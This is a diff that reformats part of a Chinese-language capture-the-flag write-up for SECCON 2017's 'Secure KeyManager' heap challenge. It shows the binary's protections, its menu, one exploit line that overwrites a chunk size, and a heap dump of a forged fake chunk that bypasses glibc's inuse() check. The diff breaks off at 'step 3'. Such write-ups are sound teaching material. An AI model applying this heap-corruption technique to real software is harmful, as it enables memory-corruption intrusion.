@@ -1,25 +1,30 @@
 ## SECCON 2017 Online CTF - Secure KeyManager
-@[36 solved | 400 points]
->Arch:     amd64-64-little
->RELRO:    Partial RELRO
->Stack:    Canary found
->NX:       NX enabled
->PIE:      No PIE (0x400000)
- 
+```
+Points:   400
+Solved:   36
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
 ### 概要
 程序开始后我们面临如下选项：
->Set Your Account Name >>
->Set Your Master Pass >>
+```
+Set Your Account Name >>
+Set Your Master Pass >>
+```
+
 
 输入的account和master为两个大小为0x10的全局变量,然后程序就进入菜单流程：
-
->1.add
->2.show
->3.edit
->4.remove
->9.change master pass
->0.exit
-
+```
+1.add
+2.show
+3.edit
+4.remove
+9.change master pass
+0.exit
+```
 #### Add
 Add功能用于创建名为KEY的结构体，结构体如下所示：
 ```c
@@ -274,23 +279,23 @@ payload += chr(0)*2
 add('A', payload, '-32', 0) #overwrite chunk1->size
 ```
 ```plain
-0x1fad000:	0x0000000000000000	0x0000000000000021  <-- chunk 0
-0x1fad010:	0x4141414141414141	0x4141414141414141
-0x1fad020:	0x4141414141414141	0x0000000000000081  <-- chunk 1's size is modified
-0x1fad030:	0x0000000000000042	0x0000000000000000
-0x1fad040:	0x0000000000000000	0x0000000000000000
-0x1fad050:	0x0000000000000042	0x0000000000000000
-0x1fad060:	0x0000000000000000	0x0000000000000071  <-- chunk 2
-0x1fad070:	0x0000000000000000	0x0000000000000000
-0x1fad080:	0x0000000000000000	0x0000000000000000
-0x1fad090:	0x0000000000000000	0x0000000000000000
-0x1fad0a0:	0x0000000000000000	0x0000000000000071  <-- fake chunk 
+0x1fad000:  0x0000000000000000  0x0000000000000021  <-- chunk 0
+0x1fad010:  0x4141414141414141  0x4141414141414141
+0x1fad020:  0x4141414141414141  0x0000000000000081  <-- chunk 1's size is modified
+0x1fad030:  0x0000000000000042  0x0000000000000000
+0x1fad040:  0x0000000000000000  0x0000000000000000
+0x1fad050:  0x0000000000000042  0x0000000000000000
+0x1fad060:  0x0000000000000000  0x0000000000000071  <-- chunk 2
+0x1fad070:  0x0000000000000000  0x0000000000000000
+0x1fad080:  0x0000000000000000  0x0000000000000000
+0x1fad090:  0x0000000000000000  0x0000000000000000
+0x1fad0a0:  0x0000000000000000  0x0000000000000071  <-- fake chunk
                                                         chunk1 + chunk1->size = fake chunk
                                                         fake chunk->size & PREV_INUSE == 0x01
                                                         bypass the inuse() check
-0x1fad0b0:	0x0000000000000000	0x0000000000000000
-0x1fad0c0:	0x0000000000000000	0x0000000000000000
-0x1fad0d0:	0x0000000000000000	0x0000000000020f31
+0x1fad0b0:  0x0000000000000000  0x0000000000000000
+0x1fad0c0:  0x0000000000000000  0x0000000000000000
+0x1fad0d0:  0x0000000000000000  0x0000000000020f31
 ```
 step 3:
 ```python
